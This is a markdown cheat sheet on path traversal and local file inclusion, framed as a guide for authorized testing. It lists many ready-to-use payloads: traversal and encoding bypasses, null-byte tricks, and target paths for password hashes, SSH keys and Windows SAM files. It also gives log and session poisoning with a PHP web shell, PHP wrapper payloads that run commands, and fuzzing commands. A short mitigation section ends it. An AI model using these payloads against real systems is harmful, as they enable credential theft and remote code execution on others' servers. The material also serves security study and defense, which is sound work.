
## 📋 Table of Contents

1. What is Path Traversal
2. Simple Path Traversal
3. Bypass Techniques
4. Encoding Methods
5. Advanced Exploitation
6. Famous Payloads
7. Mitigation Strategies

---

## ⚠️ Educational Notice

**Purpose:** This guide is for authorized security testing, bug bounty programs, and educational purposes only. Always obtain proper authorization before testing any system.

---

## 🎯 What is Path Traversal?

**Path Traversal** (also known as **Directory Traversal**) vulnerabilities enable an attacker to read arbitrary files on the server running an application.

### What Can Be Accessed?

🔑 **Critical Files:**

- Application code and data
- Configuration files
- Credentials for back-end systems
- Sensitive operating system files
- Database configuration
- API keys and secrets

### Potential Impact

**Severity:** 🔴 High to Critical

**Consequences:**

- 📖 Information disclosure
- 🔑 Credential theft
- 💾 Source code exposure
- 🎯 System takeover (if write access)
- 🔓 Privilege escalation

---

## 1️⃣ Simple Path Traversal

### Basic Concept

**Vulnerable Code Example:**

```php
<?php
$file = $_GET['filename'];
include("/var/www/images/" . $file);
?>
```

**Normal Request:**

```
https://example.com/image?filename=product.jpg
```

**Malicious Request:**

```
https://example.com/image?filename=../../../../../etc/passwd
```

### Step-by-Step Exploitation

**Step 1: Identify Vulnerable Parameters**

Look for parameters that reference files:

```
?file=
?filename=
?page=
?document=
?path=
?folder=
?style=
?template=
?img=
?doc=
```

**Step 2: Test Basic Traversal**

**Linux/Unix Targets:**

```
../../../../../etc/passwd
../../../../../etc/hosts
../../../../../etc/shadow
../../../../../proc/self/environ
```

**Windows Targets:**

```
..\..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\..\windows\win.ini
..\..\..\..\..\boot.ini
```

**Step 3: Analyze Response**

**Success Indicators:**

- File contents displayed
- Different error message
- Changed response length
- Server behavior changes

---

## 2️⃣ Absolute Path Bypass

### Vulnerability

**Developer Mistake:**

```php
// Developer assumes all files are in /var/www/images/
// But doesn't validate absolute paths
$file = $_GET['filename'];
include($file);
```

### Exploitation

**No Need for ../ Sequences:**

```
/etc/passwd
/etc/hosts
/var/log/apache2/access.log
/proc/self/environ
```

**Example:**

```
Normal: https://example.com/image?filename=product.jpg
Attack: https://example.com/image?filename=/etc/passwd
```

### Common Absolute Paths

**Linux:**

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/mysql/my.cnf
/etc/apache2/apache2.conf
/var/log/apache2/access.log
/var/www/html/config.php
/home/user/.ssh/id_rsa
/root/.bash_history
```

**Windows:**

```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\Users\Administrator\Desktop\passwords.txt
```

---

## 3️⃣ Non-Recursive Stripping Bypass

### Vulnerability

**Flawed Defense Code:**

```php
// Strip ../ once (non-recursive)
$file = str_replace("../", "", $_GET['filename']);
include("/var/www/images/" . $file);
```

### How It Works

**Input:**

```
....//....//....//etc/passwd
```

**After str_replace (first pass):**

```
../ is removed → ..[REMOVED]/.[REMOVED]./etc/passwd
Result: ../../../etc/passwd
```

**Exploitation Pattern:**

```
....//     →  removes ../ → leaves ../
..././     →  removes ../ → leaves ../
....\\/    →  removes ../ → leaves ../
```

### Bypass Payloads

```
....//....//....//....//etc/passwd
....//....//....//....//....//....//etc/passwd
..././..././..././..././etc/passwd
....\\/....\\/....\\/....\\/etc/passwd
```

### Step-by-Step

**Step 1: Find Parameter**

```
https://example.com/image?filename=product.jpg
```

**Step 2: Try Regular Payload**

```
https://example.com/image?filename=../../../../etc/passwd
Response: Error or filtered
```

**Step 3: Use Bypass**

```
https://example.com/image?filename=....//....//....//....//etc/passwd
Response: File contents!
```

---

## 4️⃣ Encoding Bypass

### Single URL Encoding

**Standard Traversal:**

```
../../../etc/passwd
```

**URL Encoded Once:**

```
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

**Encoding Table:**

```
. = %2e
/ = %2f
\ = %5c
```

### Double URL Encoding

**Why Double Encode:**

- First decode by web server/proxy
- Second decode by application
- Bypasses filters that check once

**Double Encoded:**

```
..%252f..%252f..%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

**Encoding Process:**

```
Original: ../
Single:   %2e%2e%2f
Double:   %252e%252e%252f
```

### Mixed Encoding

**Combine Techniques:**

```
# Mix encoded and non-encoded
..%2f..%2f../etc/passwd

# Encode only slashes
..%2f..%2f..%2fetc%2fpasswd

# Encode dots only
%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

### UTF-8 Encoding

```
# UTF-8 variants
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd
```

---

## 5️⃣ Path Validation Bypass

### Scenario: Application Prepends Base Path

**Vulnerable Code:**

```php
$base = "/var/www/images/";
$file = $_GET['filename'];
$full_path = $base . $file;
include($full_path);
```

**URL Shows Full Path:**

```
https://example.com/image?filename=/var/www/images/product.jpg
```

### Exploitation

**Continue Traversal After Base Path:**

```
/var/www/images/../../../../../etc/passwd
```

**Full URL:**

```
https://example.com/image?filename=/var/www/images/../../../../../etc/passwd
```

**Resulting Path:**

```
/var/www/images/ + ../../../../../etc/passwd
= /etc/passwd
```

### Other Examples

**If base is shown:**

```
# Original
/home/user/uploads/image.jpg

# Exploit
/home/user/uploads/../../../../../../etc/passwd
```

**Apache document root:**

```
# Original
/var/www/html/images/logo.png

# Exploit
/var/www/html/images/../../../../../etc/passwd
```

---

## 6️⃣ Extension Validation Bypass

### Vulnerability

**Flawed Validation:**

```php
$file = $_GET['filename'];
if (!preg_match('/\.(jpg|png|gif)$/i', $file)) {
    die("Invalid file type");
}
include("/var/www/images/" . $file);
```

### Null Byte Injection (%00)

**How It Works:**

- Null byte terminates string in C-based languages
- Extension check sees `.png`
- File operation stops at null byte

**Payload:**

```
../../../../etc/passwd%00.png
../../../../etc/shadow%00.jpg
../../config.php%00.gif
```

**URL Encoded:**

```
../../../../etc/passwd%2500.png  (double encoded)
```

**Step-by-Step:**

```
1. Extension check: passwd%00.png ✓ (ends with .png)
2. File read: passwd (stops at %00)
3. Result: /etc/passwd content
```

### Platform Requirements

**Works on:**

- PHP < 5.3.4
- Older versions of many languages
- Legacy systems

**Doesn't work on:**

- Modern PHP versions
- Python 3
- Most modern languages

### Alternative Extension Bypasses

**1. Case Manipulation:**

```
file.PHP
file.pHp
```

**2. Append Valid Extension:**

```
shell.php.jpg
config.php.png
```

**3. Double Extensions:**

```
file.jpg.php
file.png.php
```

---

## 🎯 Advanced Exploitation Techniques

### Log Poisoning via Path Traversal

**Step 1: Access Log File**

```
../../../../../var/log/apache2/access.log
```

**Step 2: Inject PHP Code in User-Agent**

```
User-Agent: <?php system($_GET['cmd']); ?>
```

**Step 3: Execute Commands**

```
?filename=../../../var/log/apache2/access.log&cmd=whoami
```

### /proc/self/environ Exploitation

**Access Environment Variables:**

```
../../../../../proc/self/environ
```

**Inject Code via User-Agent:**

```
User-Agent: <?php system($_GET['cmd']); ?>
```

**Execute:**

```
?filename=../../../proc/self/environ&cmd=id
```

### Session File Inclusion

**Find Session Files:**

```
../../../../../tmp/sess_[SESSION_ID]
../../../../../var/lib/php/sessions/sess_[SESSION_ID]
```

**Poison Session:**

```
1. Store payload in session variable
2. Include session file
3. Execute payload
```

### Filter Bypass Combinations

**Multiple Techniques:**

```
# Encoding + Non-recursive
....//....%2f....//....%2fetc/passwd

# Absolute path + Encoding
%2fetc%2fpasswd

# Null byte + Encoding
..%2f..%2f..%2fetc%2fpasswd%00.png

# All combined
....//....%252f....//....%252fetc%252fpasswd%2500.jpg
```

---

## 🔥 Famous & Powerful Payloads

### Linux/Unix Systems

#### Critical System Files

**Password Files:**

```
/etc/passwd                          # User accounts
/etc/shadow                          # Password hashes (requires root)
/etc/group                           # Group information
/etc/security/passwd                 # AIX passwords
```

**System Configuration:**

```
/etc/hosts                           # Host-to-IP mappings
/etc/hostname                        # System hostname
/etc/resolv.conf                     # DNS configuration
/etc/network/interfaces              # Network config
/etc/sysconfig/network               # RedHat network config
```

**Web Server Configuration:**

```
/etc/apache2/apache2.conf            # Apache config
/etc/nginx/nginx.conf                # Nginx config
/usr/local/apache2/conf/httpd.conf   # Apache alternate
/etc/httpd/conf/httpd.conf           # RedHat Apache
/opt/lampp/etc/httpd.conf            # XAMPP
```

**Application Configuration:**

```
/var/www/html/config.php             # Web app config
/var/www/html/.env                   # Environment variables
/var/www/html/wp-config.php          # WordPress
/var/www/html/configuration.php      # Joomla
/var/www/html/sites/default/settings.php  # Drupal
```

**Database Configuration:**

```
/etc/mysql/my.cnf                    # MySQL config
/etc/postgresql/pg_hba.conf          # PostgreSQL
/var/lib/mysql/mysql/user.MYD        # MySQL users
```

**SSH & Keys:**

```
/root/.ssh/id_rsa                    # Root SSH private key
/root/.ssh/authorized_keys           # Root SSH public keys
/home/user/.ssh/id_rsa               # User SSH keys
/home/user/.ssh/known_hosts          # SSH known hosts
```

**Log Files:**

```
/var/log/apache2/access.log          # Apache access logs
/var/log/apache2/error.log           # Apache error logs
/var/log/nginx/access.log            # Nginx access logs
/var/log/auth.log                    # Authentication logs
/var/log/syslog                      # System logs
/var/log/messages                    # General messages
/var/log/secure                      # Security logs
/var/log/wtmp                        # Login records
```

**Proc Filesystem:**

```
/proc/self/environ                   # Current process environment
/proc/self/cmdline                   # Current process command line
/proc/self/stat                      # Process status
/proc/self/fd/0                      # File descriptors
/proc/version                        # Kernel version
/proc/cpuinfo                        # CPU information
/proc/meminfo                        # Memory information
```

**History Files:**

```
/root/.bash_history                  # Root command history
/home/user/.bash_history             # User command history
/root/.mysql_history                 # MySQL history
/home/user/.php_history              # PHP history
```

### Windows Systems

#### Critical System Files

**System Configuration:**

```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\system.ini
C:\boot.ini
C:\Windows\System32\config\SAM       # Security Account Manager
C:\Windows\System32\config\SYSTEM
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM
```

**Web Server Files:**

```
C:\inetpub\wwwroot\web.config        # IIS config
C:\xampp\apache\conf\httpd.conf      # XAMPP Apache
C:\wamp\bin\apache\apache2.4.9\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\httpd.conf
```

**Application Files:**

```
C:\inetpub\wwwroot\Global.asax       # ASP.NET
C:\inetpub\wwwroot\web.config
C:\xampp\htdocs\config.php
C:\wamp\www\config.php
```

**User Files:**

```
C:\Users\Administrator\Desktop\passwords.txt
C:\Users\Administrator\Documents\
C:\Users\Administrator\AppData\
```

**Database Configuration:**

```
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\xampp\mysql\bin\my.ini
```

### Universal Payloads

#### Traversal Depth Variations

```
# Try different depths (1-10 levels)
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd
../../../../../../../../../../etc/passwd
```

#### Platform-Agnostic

```
# Works on both Unix and Windows
....//....//....//....//etc/passwd
....//....//....//....//windows/win.ini

# With encoding
..%2f..%2f..%2f..%2fetc%2fpasswd
..%5c..%5c..%5c..%5cwindows%5cwin.ini
```

#### Bypass Combinations

```
# Non-recursive + Encoding
....//....%2f....//....%2fetc/passwd

# Double encoding
..%252f..%252f..%252fetc%252fpasswd

# Null byte (legacy)
../../../../etc/passwd%00.jpg

# Absolute path + Encoding
%2fetc%2fpasswd

# Mixed slashes
..\/..\/..\/etc/passwd

# Unicode
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

# Overlong UTF-8
..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd
```

---

## 🛠️ Professional Testing Techniques

### Automated Fuzzing

**Using Burp Suite Intruder:**

```
1. Intercept request with file parameter
2. Send to Intruder
3. Mark parameter as payload position
4. Load path traversal wordlist
5. Start attack
6. Look for different response lengths
```

**DotDotPwn Tool:**

```bash
dotdotpwn -m http -h target.com -o unix -d 5 -f /etc/passwd
```

**ffuf Fuzzing:**

```bash
ffuf -w path-traversal.txt -u https://target.com/image?file=FUZZ -fs 0
```

### Manual Testing Checklist

- [ ] Test with basic `../` sequences
- [ ] Try absolute paths (`/etc/passwd`)
- [ ] Test encoded versions (`%2e%2e%2f`)
- [ ] Try double encoding (`%252e%252e%252f`)
- [ ] Test non-recursive bypass (`....//`)
- [ ] Try null byte injection (`%00`)
- [ ] Test with different file extensions
- [ ] Try mixed encoding techniques
- [ ] Test platform-specific paths
- [ ] Try wrapper protocols (php://, file://, etc.)

### Response Analysis

**Success Indicators:**

```
✓ File contents displayed
✓ Different response code
✓ Changed response length
✓ Error messages with path info
✓ Timing differences
```

**Failure Indicators:**

```
✗ Same generic error
✗ Identical response length
✗ Blocked/filtered message
✗ WAF detection
```

---

## 🔐 PHP Wrapper Exploitation

### php://filter

**Read Source Code:**

```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=../../../../etc/passwd
```

**Full URL:**

```
?file=php://filter/convert.base64-encode/resource=index.php
```

**Decode Result:**

```bash
echo "BASE64_OUTPUT" | base64 -d
```

### php://input

**Send Payload in POST Body:**

```
?file=php://input

POST Body:
<?php system($_GET['cmd']); ?>
```

### data://

**Inline PHP Execution:**

```
?file=data://text/plain,<?php system($_GET['cmd']); ?>
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

### expect://

**Direct Command Execution:**

```
?file=expect://whoami
?file=expect://id
```

---

## 🛡️ Mitigation Strategies

### For Developers

#### 1. Use Whitelisting

```php
// ✅ Good - Whitelist approach
$allowed_files = ['page1.php', 'page2.php', 'page3.php'];
$file = $_GET['filename'];

if (in_array($file, $allowed_files)) {
    include($file);
} else {
    die("Access denied");
}
```

#### 2. Sanitize Input

```php
// ✅ Good - Remove traversal sequences
$file = basename($_GET['filename']);
include("/var/www/pages/" . $file);
```

#### 3. Use realpath()

```php
// ✅ Good - Resolve absolute path and validate
$base_dir = "/var/www/pages/";
$file = $_GET['filename'];
$real_path = realpath($base_dir . $file);

// Check if resolved path starts with base directory
if ($real_path && strpos($real_path, $base_dir) === 0) {
    include($real_path);
} else {
    die("Access denied");
}
```

#### 4. Disable Directory Listing

```apache
# Apache .htaccess
Options -Indexes
```

#### 5. Use File IDs

```php
// ✅ Best - Use database IDs
$file_id = intval($_GET['id']);
$files = [
    1 => 'page1.php',
    2 => 'page2.php',
    3 => 'page3.php'
];

if (isset($files[$file_id])) {
    include("/var/www/pages/" . $files[$file_id]);
}
```

### Defense in Depth

**Multiple Layers:**

```
1. Input validation (whitelist)
2. Sanitize with basename()
3. Use realpath() verification
4. Restrict file permissions
5. Run with minimal privileges
6. Implement logging and monitoring
7. Use Web Application Firewall (WAF)
8. Regular security audits
```

---

## 📊 Quick Reference Cheat Sheet

### Basic Payloads

```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd

/etc/passwd
/etc/shadow
/etc/hosts

C:\Windows\win.ini
C:\boot.ini
```

### Encoded Payloads

```
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
```

### Bypass Techniques

```
....//....//....//etc/passwd
..././..././..././etc/passwd
..%2f..%2f..%2fetc%2fpasswd%00.png
/var/www/images/../../../../../etc/passwd
```

### PHP Wrappers

```
php://filter/convert.base64-encode/resource=index.php
php://input
data://text/plain,<?php system($_GET['cmd']); ?>
```

---

## 🎓 Practice Resources

### Vulnerable Applications

- **bWAPP** - Path Traversal modules
- **DVWA** - File Inclusion section
- **WebGoat** - Path Traversal lessons
- **PortSwigger Academy** - Directory traversal labs
- **HackTheBox** - Various machines
- **TryHackMe** - Path Traversal rooms

### Wordlists & Tools

- **SecLists** - Fuzzing/path-traversal-attack.txt
- **PayloadAllTheThings** - File Inclusion
- **DotDotPwn** - Automated traversal
- **Burp Suite** - Intruder with custom payloads

---

_Remember: This guide is for authorized security testing only. Always obtain proper permission before testing any system. Report vulnerabilities responsibly._ 🔐